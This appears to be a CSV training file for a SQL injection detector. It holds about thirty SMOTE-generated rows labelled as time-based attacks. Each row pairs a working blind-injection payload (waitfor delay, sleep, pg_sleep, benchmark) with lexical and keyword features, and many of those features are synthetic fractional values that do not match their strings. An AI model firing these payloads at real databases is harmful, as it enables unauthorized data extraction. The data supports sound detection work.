id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000031,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000072,0.6680690567350825,47.890210028348115,22.293229551897298,3.762283438864887,14.57593773113838,10.01052137265622,16.44510501417406,6.85864591037946,0.31103426224667724,0.20469525334255437,0.3371714504480128,0.14709903396275567,2.14135408962054,-1.1102230246251565e-16,0.0,0.0,0.0,0.8586459103794598,0.0,1.85864591037946,0.0,0.0,0.0,0.8586459103794597,1.0,0.0,0.0,0.0,0.0,0.8586459103794598,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8586459103794598,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.85864591037946
SMOTE_000032,attack,time,1'||  (  select 'sbip' from dual where 7302  =  7302 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',nearest_attack_euclidean,R000124,1.5511797654368196,132.4846117705864,30.045383531175926,3.616411368071321,48.068075296763894,10.0,55.39384470823457,19.022691765587965,0.3623570077957967,0.07588137853177776,0.4182115308476267,0.1435500828247989,3.6742305885293214,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.674230588529323,0.0,0.0,0.0,5.348461177058642,1.0,0.0,0.0,0.3257694114706789,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,1.674230588529321,0.674230588529321,0.32576941147067895,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.674230588529321
SMOTE_000033,attack,time,"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",nearest_attack_euclidean,R000159,0.07864383751432283,118.88039638877632,25.039867870407896,3.129270236522774,18.15947148163159,29.840528518368412,57.84052851836841,13.039867870407898,0.15283185627397827,0.2509564216570649,0.4864995837835067,0.10971213828545012,0.07973574081579504,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,9.960132129592102,0.0,0.0,1.0,2.0,0.019933935203948594,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000034,attack,time,1'  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000171,1.8775714335946831,39.80180193456821,20.07726960280158,3.803380359311196,16.56999312616347,4.0,11.154539205603154,8.077269602801579,0.41561641219054685,0.11084187602616123,0.2695103595112941,0.2040313522719978,4.246361761680947,-1.1102230246251565e-16,0.0,0.0,0.0,0.4154539205603156,0.0,1.4154539205603154,0.0,0.0,0.0,0.4154539205603158,1.0,0.0,0.0,0.0,0.0,0.41545392056031566,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4154539205603156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4154539205603154
SMOTE_000035,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000054,0.4570165668717674,69.15237054287951,22.847629457120487,3.486620151943643,23.60948217151806,4.0,28.69525891424097,12.847629457120485,0.34131464748416507,0.05784482770776024,0.41502155679898983,0.18581896800908485,2.0,4.0,0.0,0.0,0.0,0.8476294571204853,0.0,4.0,0.0,0.0,0.0,0.8476294571204854,1.0,1.0,0.0,0.0,0.0,0.8476294571204853,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000078,0.257828151281881,63.72200582979454,27.634858808512725,4.278938452655401,26.087147021281815,12.0,13.90871470212818,11.726144106384544,0.40789453966179956,0.18924160785594737,0.21899196803053042,0.18387188445172276,4.817429404256362,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.908714702128182,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9087147021281814,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.908714702128181
SMOTE_000037,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000029,0.7208597737673571,59.167323872865126,23.416338063567437,3.647283249862413,20.167323872865122,10.0,22.0,7.0,0.3406682847821091,0.16905941415843356,0.3719307111485538,0.11834158991090349,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.41633806356743897,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.416338063567439
SMOTE_000038,attack,time,"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R000291,3.367235048161996,144.5106386823577,27.83372735860584,3.2618555667281655,45.50591037908762,15.002364151635048,67.50118207581752,16.501182075817525,0.3135586967615186,0.10315667508394205,0.46908090542944697,0.11420372272509241,0.8337273586058412,-1.1102230246251565e-16,0.0,0.8337273586058412,0.16627264139415876,1.0,0.0,12.0,0.0,0.8337273586058412,0.8337273586058412,2.0,0.8337273586058412,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.833727358605841,0.0,0.0,1.0,0.16627264139415876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.16627264139415876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8337273586058412,0.8337273586058412,5.833727358605842
SMOTE_000039,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000188,0.860784683378413,46.78595839019017,15.760702080490493,2.9007346664237748,13.282106241471475,1.239297919509509,23.068064631661635,9.19648959754754,0.29602344265711966,0.025831242023505827,0.4830743107204976,0.19507100459887688,0.0,3.239297919509508,0.0,0.0,0.0,1.0,0.0,3.7178937585285246,1.239297919509508,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7607020804904919,0.0,0.0,0.0,1.2392979195095082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000040,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  3124  =  3124,nearest_attack_euclidean,R000272,0.4021270592438102,102.38426932071039,23.6986891100592,3.0260455148434486,28.0,9.0,52.986891100592,12.3973782201184,0.2743115675451735,0.08817157528237721,0.5165687850966448,0.12094807207580441,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,10.3973782201184,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000041,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,nearest_attack_euclidean,R000213,1.3593788828617508,62.70278773414999,18.828033018404547,2.9592709301154363,19.562622642127273,1.6093443394681817,31.702787734149997,9.828033018404545,0.3171763160468623,0.025165377205775094,0.5018087472704291,0.15584955947693352,3.6093443394681817,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.218688678936363,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3906556605318185,0.0,0.0,0.0,1.0,0.6093443394681817,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000042,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000155,0.48726435114423305,51.67786791071832,19.26548217262129,3.233441459474925,18.14690356547574,2.0,22.824771476194066,8.706192869048516,0.3531664951017515,0.03886975307828616,0.43972729776202646,0.16823645405793586,0.0,4.0,0.0,0.0,0.0,1.0,0.0,3.706192869048516,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.146903565475742,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000043,attack,time,"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000087,0.6428232453560814,110.76417356675945,30.588057855586484,3.466098636528189,38.74089256893838,10.0,49.30566942670378,12.717611571117297,0.3490323068861544,0.0906398490723831,0.4453199245361915,0.11500791950527098,0.0,1.0,0.0,0.0,1.0,1.0,0.0,8.717611571117297,0.0,0.0,0.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.28238842888270316,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.282388428882703
SMOTE_000044,attack,time,1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000113,0.4892257179976222,118.17177074633369,30.324430131705945,3.392715169152308,39.198480351215856,10.0,55.198480351215856,13.774810043901983,0.33116096816929375,0.08495568247749125,0.4670900601332798,0.11679328921993522,1.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.774810043901983,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.22518995609801795,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.225189956098018
SMOTE_000045,attack,time,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000244,1.3935455522140803,54.19632550347322,18.601224832175596,3.080937455155206,10.601224832175596,10.0,25.59510067129762,8.0,0.19599236373554624,0.18464849897751612,0.4716403381049248,0.1477187991820129,0.6012248321755953,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.398775167824405,0.0,0.0,1.0,1.0,0.6012248321755953,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6012248321755953,0.39877516782440475,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000046,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000036,0.6702614202855631,79.9967012533334,23.332233751111133,3.354017120214802,21.222588749629622,10.0,36.21929000296302,12.554822500740755,0.26617466607912255,0.12529785958347242,0.45173857878655177,0.1567888955508533,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.554822500740756,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2225887496296222,0.777411250370378,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,time,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000205,1.5634753811191786,78.99044851448038,22.102789552722783,3.2548627598499005,19.654184329084178,14.411158210891138,35.71952686905949,9.205579105445569,0.2540347721655722,0.1790887650347374,0.4511038016468767,0.1157726611528137,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.5513947763613922,0.0,5.1027895527227844,0.0,0.0,0.5513947763613921,3.5513947763613922,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000048,attack,time,select pg_sleep  (  5   )    )   +',nearest_attack_euclidean,R000294,1.6333252262764066,34.39740700671022,13.397407006710218,2.9332592711467567,12.397407006710218,1.0,15.0,6.0,0.3599506096516232,0.0290931541067444,0.43639731160116596,0.1745589246404664,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.6987035033551089,0.0,1.3012964966448912,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.3012964966448912,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3012964966448912,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3012964966448912
SMOTE_000049,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000199,0.7163978659269388,50.67382303440887,17.673823034408873,3.04231705009985,10.0,10.0,24.0,6.673823034408873,0.19735755672780836,0.19735755672780836,0.47365813614674,0.13162675039764332,0.6738230344088734,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.6738230344088733,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000050,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000035,0.8035939339224181,95.16924964647846,29.179124924245386,3.759307108130711,29.084624823239228,18.0,37.358249848490765,10.726374974748461,0.3047095803279681,0.19001230022143645,0.39237860948163117,0.1128995099689643,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.726374974748461,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.7263749747484612,0.27362502525153876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000051,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000097,0.20454715651154962,83.89228580831548,26.89228580831547,3.2909133680176725,20.0,10.0,41.0,12.89228580831547,0.23840422889180873,0.11920211444590437,0.4887286692282079,0.15366498743407897,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,7.0,0.8922858083154716,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,time,1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000222,1.300015742937099,111.43860603807127,27.540099568709195,3.3037649108786877,35.299502156454025,10.0,52.67920345032644,13.459900431290805,0.3166045399897015,0.09008514922923468,0.4723349072764133,0.1209754035046505,1.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.459900431290805,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.540099568709195,0.4599004312908051,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000053,attack,time,1'  )   as irck where 3660  =  3660 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000296,0.010575140588527172,112.99503295617896,30.0,3.4713773203011478,38.0,10.0,51.0,13.995032956178962,0.33629809953106826,0.0884994998765969,0.4513474493706442,0.12385495122169068,0.9950329561789627,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,4.0,0.9950329561789627,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000054,attack,time,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",nearest_attack_euclidean,R000105,0.06750917204202589,135.47423158318182,25.038945808653196,2.915930831474659,40.9415812870202,2.0,72.61054191346803,19.922108382693608,0.30238879925285295,0.014776817109662471,0.5357808145344966,0.14705356910298797,0.0,4.0,0.0,0.0,1.0,1.0,0.0,13.922108382693605,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.019472904326598706,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.019472904326599
SMOTE_000055,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000238,0.1333183452845285,50.060700031910685,17.060700031910685,2.9928716071607875,10.0,10.0,24.0,6.0607000319106845,0.1997619606591738,0.1997619606591738,0.47942870558201706,0.12104737309963534,0.06070003191068429,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.06070003191068429,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000056,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000188,0.8596106781612699,46.76491081486784,15.761754459256608,2.9012771599558422,13.285263377769825,1.2382455407433905,23.050174192637662,9.191227703716958,0.29618752321742814,0.02582235095866152,0.48293932819058866,0.19505079763332164,0.0,3.238245540743392,0.0,0.0,0.0,1.0,0.0,3.714736622230175,1.2382455407433917,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7617544592566083,0.0,0.0,0.0,1.2382455407433919,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000057,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000149,0.26626791424218554,92.52771888111106,28.802105419583356,3.783694056991634,25.06596486013888,18.0,35.26385944055553,14.197894580416644,0.27096476033750005,0.1946196804500001,0.38106575083611105,0.15334980837638876,3.065964860138881,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.065964860138881,0.0,0.0,1.0,4.131929720277763,1.0,0.0,0.0,0.9340351398611185,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.06596486013888136,0.9340351398611186,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000058,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000014,2.581874433157594,113.60733576702637,34.20244525567546,4.129181705785214,35.85427919743205,28.10122262783773,36.10122262783773,13.550611313918864,0.3148490638168841,0.24757973419217189,0.3181947749417038,0.11937642704924022,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,3.550611313918864,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.5506113139188641,1.0,0.0,1.0,0.5506113139188641,0.5506113139188641,0.4493886860811359,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.550611313918864
SMOTE_000059,attack,time,"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000076,1.1125783847363822,101.89752087255809,27.855785163604644,3.717909120012428,25.0929752726744,28.23719010906976,38.948760436279045,9.61859505453488,0.24585429407103132,0.27803828768874295,0.38151874501516675,0.094588673225059,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.618595054534881,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.6185950545348804,0.38140494546511966,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,time,1' where 6035  =  6035 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000233,0.6882004691490761,46.0,22.28867847382131,4.13228563432229,17.0,12.0,9.0,8.0,0.3695652173913043,0.2608695652173913,0.1956521739130435,0.17391304347826086,2.711321526178688,0.28867847382131157,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.2886784738213115,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000061,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",nearest_attack_euclidean,R000108,0.39980154512140365,95.53401604581259,27.901360641832504,3.74235435308256,33.81632770199005,15.0,35.81632770199005,10.901360641832504,0.35299266888336367,0.15823172481308512,0.374090232191775,0.11468537411177618,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.09863935816749614,0.0,6.704081925497512,0.09863935816749604,0.0,1.0,0.09863935816749625,1.0,0.0,0.0,0.0,0.0,0.09863935816749603,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
